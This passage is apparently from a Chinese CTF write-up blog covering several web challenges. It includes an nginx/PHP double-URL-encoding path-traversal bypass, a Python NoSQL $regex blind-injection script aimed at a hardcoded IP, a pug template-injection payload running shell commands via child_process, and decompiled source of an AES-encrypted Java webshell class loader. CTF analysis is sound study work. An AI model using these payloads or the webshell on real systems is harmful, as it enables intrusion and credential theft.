+<span class="token string">'base'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'%20'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token string">'query'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span> <span class="token operator">!=</span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">// Default url</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Merge URL query parameters with $_GET</span>
+        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$_GET</span> <span class="token operator">+</span><span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+</code></pre>
+<p>过程就是把REQUEST_URI按照SCRIPT_NAME把前面半边截掉，把剩下的部分作为url<br>再看一下matchUrl这个函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>花里胡哨的这里没有用的代码
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#^'</span><span class="token punctuation">.</span><span class="token variable">$regex</span><span class="token punctuation">.</span><span class="token string">'(?:\?.*)?$#'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$case_sensitive</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ids</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">regex</span> <span class="token operator">=</span> <span class="token variable">$regex</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+</code></pre>
+<p>这里的$regex就是我们的路由，$url就是之前的url，这个正则虽然抽象了一点，但是试一下还是能发现其能够让<code>/admin?xxx</code>这种形式的输入匹配上<code>/admin</code>这个路由，在route这个函数的开始，他对我们输入的url进行了一次urldecode，所以我们如果访问的是<code>/admin%3flogin</code>这样的路径，在这里就会变成<code>/admin?login</code>这样的字符，且能被正确匹配到<code>/admin</code>路由上<del>但其实有没有这个urldecode都一样</del><br>加上之前url初始化的时候用base截去了最后一个<code>/</code>前的所有内容，确保了我们使用<code>/aa/admin%3flogin</code>这样的路由访问能绕过nginx对<code>/admin</code>开头的匹配，又能让PHP正确匹配上路由</p>
+<blockquote>
+<p>Q:为什么不能直接访问<code>/aa/admin?login</code><br>A:因为nginx.conf中有一项<code>fastcgi_param  REQUEST_URI  $uri;</code>，作用为在向fastcgi传递一个REQUEST_URI参数，而该参数是被nginx解析过的<code>$uri</code>变量，该变量仅包括路径，<strong>不包括query_string</strong>。而url来自REQUEST_URI，就是这个nginx的$uri变量，不包含query_string，这样子后端收到的内容就是<code>/aa/admin</code>，并没有login字符，而根据index.php中的逻辑，没有login的话会被框架重定向到<code>/login</code>下</p>
+</blockquote>
+<p>接下来只需要提交一个数据到admin路由下就行了，代码中是将输入拼了一个<code>./</code>再读的，而全局过滤又禁用了<code>../</code>目录穿越，而这里我们用了一个二次编码就绕过了</p>
+<p>看到query参数的解析，首先是直接把全部的$_GET赋值过来，这很合理<br>然后还有一步额外的解析</p>
+<pre class=" language-php"><code class="language-php">        <span class="token comment" spellcheck="true">// Default url</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Merge URL query parameters with $_GET</span>
+        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$_GET</span> <span class="token operator">+</span><span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>这里先调用了一个parse_url，然后就补了一个parse_str，而parse_str在进行解析的时候会进行一次urldecode。成了</p>
+<p>但是这里似乎还是有哪里不太对，因为URL是收的nginx转发过来的REQUEST_URI，我们如果使用<code>%3f</code>去让nginx认为<code>/aa/admin%3flogin</code>是一个完整的url，那么nginx在和fpm通信时，理论上是不会解码这个数据的，那么后端收到的url也应该是<code>/aa/admin%3flogin</code>，而在route的时候因为进行了url解码，所以能正确解析，但参数解析时并不会进行url解码，那么<code>%3f</code>后面的内容也就不会被parse_url放到<code>$args[&#39;query&#39;]</code>中去，也就不会经历第二次解码才对</p>
+<blockquote>
+<p>Q:为什么要二次编码，如果nginx转发时不解码的话不是一次编码就行？<br>A:因为nginx他真的解码了一次，不然这里也没法继续做了，应该是出题人故意写了个不是那么正确的配置导致的这个问题</p>
+</blockquote>
+<p>我修改了nginx和fastcgi的通信目的地，靠nc抓了一份通信流量下来，该流量中REQUEST_URI出现了两遍，后面一遍应当是在nginx.conf中配置发送的变量，且后端以后面的变量作为输入</p>
+<pre><code>SCRIPT_NAME/aa/aa/admin?login&amp;data=..%2f..%2f..%2f..%2fflag
+REQUEST_URI/aa/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag
+REQUEST_URI/aa/aa/admin?login&amp;data=..%2f..%2f..%2f..%2fflag
+</code></pre>
+<p>我们发现，配置文件中通过<code>$uri</code>添加的REQUEST_URI被解码了一次，而这样就导致上面说的一切全部变得合理起来</p>
+<blockquote>
+<p>Q:就算这样，一次编码过来直接解码了，这个数据也不在$_GET里面，不会被waf检测，为什么不能直接一次编码呢<br>A:因为这样子一次解码过来虽然直接解码了，但是出现了<code>/</code>，会被认为是一个路径，就要过路由选择，这样子就会被当成路由不带login然后被重定向掉</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我自己都快被绕晕了<br>这题的漏洞点在于，各种额外的urldecode。nginx的错误配置导致输入的uri被解码一次，这样子就能用%3f让nginx认为后面的内容不是query string，而nginx在发给后端时又解了一次码，在后端进行解析的时候因为解了一次码又成功的把变量解析进去了<br>路由绕过那个地方，因为nginx本身decode了一下，所以有没有urldecode都能绕过</p>
+<p>正确的使用方法，我估计是把那行$uri去掉，或者改成$request_uri，这个是nginx和fpm通信的默认值，这个值是携带query_string但不会进行解码的，再把路由匹配前面的urldecode删掉，就无敌了</p>
+<p>在修改$uri为$request_uri后，尝试如下payload<br><code>/aa/admin%3flogin?data=..%252f..%252f..%252f..%252fflag</code><br>这个显式的提交data，因为nginx不解码，所以在GET中解码一次也好，在parseQuery中解码一次也好，都只解码一次，不能用<br>若只编码一次，在GET中解码一次直接被waf拦截</p>
+<p><code>/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag</code><br>将<code>?</code>改为<code>&amp;</code>，由于发到后端没有解码，%3f不能当问号使了直接啥都没解析出来</p>
+<p>就修好了</p>
+<h2 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h2><p>这个题比较简单，思路较为清晰，所以出的人也最多。。。呜呜</p>
+<p>功能点不多，所以很好找入手点<br>user就登录注册两个功能，不过注册这里写死了一项，新注册的用户的active属性都是false，也就意味着新注册的用户都没法用</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">await</span> db<span class="token punctuation">.</span>Users<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
+</code></pre>
+<p>那就只能去登录他已有的用户了，数据库初始化的时候有这么一项</p>
+<pre class=" language-javascript"><code class="language-javascript">users<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+    username<span class="token punctuation">:</span> <span class="token string">'rabbit'</span><span class="token punctuation">,</span>
+    password<span class="token punctuation">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    active<span class="token punctuation">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>不过这个密码超级随机数[a-z0-9]{64}，爆破是不可能的了，并且十分钟重置一次环境，神仙来了都爆不出来<br>看看登录的地方，因为用的是MongoDB，这种nosql数据库和普通SQL区别比较大，一般来说不会有什么注入的地方，除非用了where语句</p>
+<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token keyword">let</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
+    <span class="token keyword">let</span> rec <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span>Users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">{</span>username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> password<span class="token punctuation">:</span> password<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>rec<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>rec<span class="token punctuation">.</span>username <span class="token operator">===</span> username <span class="token operator">&amp;&amp;</span> rec<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> rec<span class="token punctuation">,</span> <span class="token punctuation">{</span>signed<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'You Bad Bad >_&lt;'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'Login Failed!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>这里其实非常可疑，之前在注册时对输入的用户名进行了类型校验，而这里没有，且当我输入用户名密码登录成功后，还检查了一遍这个用户的用户名密码和我输入的用户名密码是否一致。理论上如果我是输入用户名密码登录进来的那这里绝对是一致的，那这里就必然是在防一手注入，也就意味着有我不懂的nosql注入存在</p>
+<p>搜了一下发现是在查询时通过数组的方式去添加条件项进行查询，比如<code>&#123;&quot;password&quot;:&#123;&quot;$ne&quot;: 1&#125;&#125;</code>这样一句，就是寻找一个password不是1的记录，而这样的查询可以通过password[$ne]&#x3D;1来提交，这样子就能万能密码登录，但这里防了一手万能密码，不过翻文章看到存在一个条件项为$regex，支持正则表达式。盲注搞定<br>写一个垃圾脚本</p>
+<pre class=" language-python3"><code class="language-python3">import requests
+import time
+
+url = "http://123.60.21.23:23333/user/login"
+password = ""
+numset = "1234567890"
+charset = "abcdef"
+for i in range(64):
+    data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password + "[a-z]")}
+    res = requests.post(url, data)
+    if "You Bad Bad" in res.text:
+        for c in charset:
+            data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password+c)}
+            res = requests.post(url, data)
+            time.sleep(0.2)
+            if "You Bad Bad" in res.text:
+                password += c
+                print(password)
+                break
+    else:
+        for n in numset:
+            data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password+n)}
+            res = requests.post(url, data)
+            time.sleep(0.2)
+            if "You Bad Bad" in res.text:
+                password += n
+                print(password)
+                break
+</code></pre>
+<p>稍微二分了一下注的快一点，不然十分钟重置一次光注入都要一两分钟。。。<br>登进来之后看能用的功能，就这一个能用，剩下的要么就没能输入的东西，要么就输入的东西不可控</p>
+<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/order'</span><span class="token punctuation">,</span> checkLogin<span class="token punctuation">,</span> checkActive<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token keyword">let</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> candyname<span class="token punctuation">,</span> address<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
+    <span class="token keyword">let</span> tpl_path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../views/confirm.pug'</span><span class="token punctuation">)</span>
+    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>tpl_path<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> result<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'Fail to load template!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">let</span> tpl <span class="token operator">=</span> result
+                <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'USERNAME'</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'CANDYNAME'</span><span class="token punctuation">,</span> candyname<span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'ADDRESS'</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>
+            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>pug<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span>filename<span class="token punctuation">:</span> tpl_path<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>直接进行模板内容的替换再渲染&#x3D;&#x3D;&#x3D;模板可控<br>找一找pug的模板注入怎么打翻到了如下payload</p>
+<blockquote>
+<p>但在pug中不能直接使用require，而是采用global.process的形式<br>❗️根据pug的语法，<code>-</code>后面表示变量或者表达式</p>
+</blockquote>
+<p>闭合一下后面的括号，再把垃圾注释掉就行<br>这里遇到一个小坑，就是pug这个模板语法对缩进的要求有点严格，之前打半天打不通，本地搭了环境之后报错似乎是说我缩进不对，然后又是换行又是加缩进的，总算是把命令执行掉了</p>
+<pre><code>11&#39;)%0d%0a    -var%20x=eval(&quot;global.process.mainModule.require(&#39;child_process&#39;)[&#39;execSync&#39;](&#39;whoami&#39;).toString()&quot;)%0d%0a    -return%20x%0d%0a    //-
+</code></pre>
+<p>又：pug模板能include外部文本，但是在不指定后缀的情况下会默认添加pug后缀，所以这里不能直接include，但是有一个题flag是flag.txt就能直接include进来</p>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>没看懂怎么打，但是我看懂了所有人提交的内容都可以在issue里找到，那必然有人的payload能拿到flag，有些人发了1-100000的全部数字，有的人只发了几个数字，随便翻了翻，翻到几个人在issue里的数字就那么一两个，拿起来一交就成了</p>
+<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p>虽然是个misc，但感觉还是有点web<br>不过很简单<br>访问上去能直接给个war包，反编译出来就是个shell<br>题目描述说了半天冰蝎，但事实上冰蝎并连不上去，因为冰蝎的马应该是有密钥协商过程的，他这里直接硬编码了密钥。其实就是一个写好了的shell让你自己写个代码连上去。然后题目还说所有出站流量关了，估计就是不能弹shell出来之类的，只能通过你主动和他交互的应答包获取数据<br>至于强调了半天的冰蝎basicinfo，可能是指你要用冰蝎basicinfo搜集信息的地方获取flag</p>
+<p>先看看他的shell怎么写的</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            String k<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                k <span class="token operator">=</span> <span class="token string">"e45e329feb5d925b"</span><span class="token punctuation">;</span>
+                HttpSession session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                session<span class="token punctuation">.</span><span class="token function">putValue</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Cipher c <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilClassBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">class</span> <span class="token class-name">U</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>
+                    <span class="token function">U</span><span class="token punctuation">(</span>ClassLoader c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">super</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">public</span> Class <span class="token class-name">g</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                Class <span class="token class-name">evilClass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">g</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>evilClassBytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Object a <span class="token operator">=</span> evilClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Method b <span class="token operator">=</span> evilClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                b<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>没用的代码
+<span class="token punctuation">}</span>
+</code></pre>
+<p>感觉像是仿冰蝎写了个用aes加密的恶意类加载器。。。</p>
